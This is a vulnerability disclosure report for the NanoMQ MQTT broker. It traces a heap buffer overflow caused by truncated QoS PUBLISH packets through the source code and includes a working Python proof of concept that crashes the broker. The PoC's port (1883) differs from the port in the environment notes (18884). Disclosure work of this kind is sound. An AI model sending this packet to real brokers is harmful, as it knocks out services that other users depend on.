# NanoMQ v0.24.10 Truncated QoS PUBLISH: Heap Buffer Overflow in `decode_pub_message`

## Describe the bug

NanoMQ can be crashed by a malformed MQTT `PUBLISH` packet with `QoS > 0` when the packet body ends immediately after the topic field and omits the required Packet Identifier.

Under ASAN, the broker aborts with:

- `AddressSanitizer: heap-buffer-overflow`
- `READ of size 1`
- crash site: `decode_pub_message .../nanomq/pub_handler.c:2122`

This is a remote unauthenticated Denial-of-Service condition.

## Functional Background (Publish Decode Flow)

For inbound broker traffic, NanoMQ eventually hands `CMD_PUBLISH` messages to the application-layer publish handler:

1. transport receives the MQTT frame body into `nni_msg`
2. protocol forwards the message to broker worker logic
3. broker worker calls `handle_pub()`
4. `handle_pub()` calls `decode_pub_message()` to parse topic, packet id, properties, and payload

The crash happens in step 4 when `decode_pub_message()` assumes that a QoS 1/2 publish still has two bytes available for the Packet Identifier after the topic has been parsed.

## Root Cause Analysis

### 1) Transport allocates an exact 1024-byte body buffer for this packet shape

- file: `nng/src/sp/transport/mqtt/broker_tcp.c:791`
- function: `tcptran_pipe_recv_cb`
- behavior: allocates `nni_msg` body based on MQTT Remaining Length

- file: `nng/src/core/message.c:416-420`
- function: `nni_msg_alloc`
- behavior: when `sz` is `1024` and power-of-two aligned, allocation uses exact-size body storage without the small-message extra tail room

This matters because it makes the malformed read cross a real heap boundary instead of only crossing the logical MQTT body length.

### 2) A malformed QoS PUBLISH can pass transport pre-checks

- file: `nng/src/sp/transport/mqtt/broker_tcp.c:847-875`
- behavior: for inbound `CMD_PUBLISH` with `QoS > 0`, transport calls `nni_msg_get_pub_pid(msg)` before forwarding

- file: `nng/src/core/message.c:793-804`
- function: `nni_msg_get_pub_pid`
- behavior:
  - reads topic length into `uint8_t len`
  - truncates the real 16-bit topic length
  - then reads the packet id from `pos + len + 2`

For a crafted topic length like `0x03fe`, the high byte is truncated and the transport pre-check reads two bytes from inside attacker-controlled topic bytes instead of rejecting the truncated packet.

This allows the malformed publish to reach the application-layer decoder.

### 3) Application-layer publish parser reads packet id without checking remaining bytes

- file: `nanomq/pub_handler.c:2083-2084`
- function: `decode_pub_message`
- behavior: parses the topic using `copyn_utf8_str(msg_body, &pos, ..., msg_len)`

- file: `nanomq/pub_handler.c:2121-2123`
- function: `decode_pub_message`
- behavior:
  - if `QoS > 0`, it immediately executes `NNI_GET16(msg_body + pos, packet_id)`
  - there is no check that `pos + 2 <= msg_len`

When the packet body is:

- 2 bytes topic length
- topic body
- and nothing else

then `pos == msg_len` right after topic parsing, and `NNI_GET16(msg_body + pos, ...)` reads 2 bytes beyond the end of the heap buffer.

### 4) ASAN crash matches the missing packet-id read

Observed crash:

- file: `nanomq/pub_handler.c:2122`
- stack:
  - `decode_pub_message`
  - `handle_pub`
  - `server_cb`
  - `nano_pipe_recv_cb`
  - `tcptran_pipe_recv_cb`

ASAN reports:

- `0 bytes to the right of 1024-byte region`
- allocation point: `nni_msg_alloc .../message.c:419`
- allocation caller: `tcptran_pipe_recv_cb .../broker_tcp.c:791`

This exactly matches the malformed QoS publish layout used in the PoC below.

## Expected behavior

NanoMQ should reject a truncated QoS 1/2 `PUBLISH` packet with `PROTOCOL_ERROR` or `MALFORMED_PACKET`, and continue running.

## Actual Behavior

When the malformed packet is processed:

1. the broker accepts the TCP connection and `CONNECT`
2. the malformed `QoS1 PUBLISH` reaches `decode_pub_message()`
3. the topic parser consumes the entire body
4. the packet-id read dereferences `msg_body + msg_len`
5. ASAN reports `heap-buffer-overflow` and the broker aborts

## To Reproduce

### 1) Start NanoMQ (ASAN build)

```bash
build-asan-gcov/nanomq/nanomq start \
  --log_level debug \
  --log_stdout true
```

### 2) Python PoC (`poc_truncated_qos_publish.py`)

```python
#!/usr/bin/env python3
import socket
import time

HOST = "127.0.0.1"
PORT = 1883

# MQTT 3.1.1 CONNECT, clientid="poc"
CONNECT = bytes.fromhex(
    "10 0f"
    "00 04 4d 51 54 54"
    "04"
    "02"
    "00 3c"
    "00 03 70 6f 63"
)

# Malformed QoS1 PUBLISH
# Fixed header:
#   0x32 = PUBLISH, QoS1
# Remaining Length = 1024 => 0x80 0x08
#
# Body:
#   topic length = 0x03fe (1022)
#   topic body   = "A" * 1022
#   packet id    = intentionally omitted
BODY = b"\x03\xfe" + (b"A" * 1022)
PUBLISH = b"\x32\x80\x08" + BODY

with socket.create_connection((HOST, PORT), timeout=3) as s:
    s.sendall(CONNECT)
    print("CONNACK:", s.recv(8).hex())
    time.sleep(0.1)
    s.sendall(PUBLISH)
    time.sleep(0.5)
```

### 3) Run PoC

```bash
python3 poc_truncated_qos_publish.py
```

### 4) Expected crash evidence

Look for:

![image-20260403105415608](C:\Users\Administrator\Desktop\RuoyuZhou\bug_reports\assets\image-20260403105415608.png)

## Environment Details

- NanoMQ version:
  - `0.24.10`
  - revision tested: `0a3c709b`
- Operating system and version:
  - Linux (local ASAN test environment)
- Compiler and language used:
  - C (NanoMQ)
  - Python (PoC)
- testing scenario:
  - ASAN-instrumented build (`build-asan-gcov`)
  - TCP listener on `127.0.0.1:18884`
  - raw socket client
  - malformed QoS1 PUBLISH with body length exactly `1024`

## Client SDK

- No MQTT SDK is required.
- Reproduction uses a raw Python socket client sending exact MQTT bytes.

## Additional context

1. This issue is triggered before any valid packet-id handling can occur.
2. The crash lives in the shared application-layer publish decoder, not only in a transport-local helper.
3. The transport-side `nni_msg_get_pub_pid()` path contains a separate truncation bug (`uint8_t len`) that helps the malformed frame survive pre-checks, but the ASAN crash itself occurs later in `decode_pub_message()`.
4. Security impact:
   - remote, unauthenticated DoS against the broker process.
5. Request to maintainers:
   - Please confirm and fix this issue as soon as possible. We need to proceed with CVE ID application.
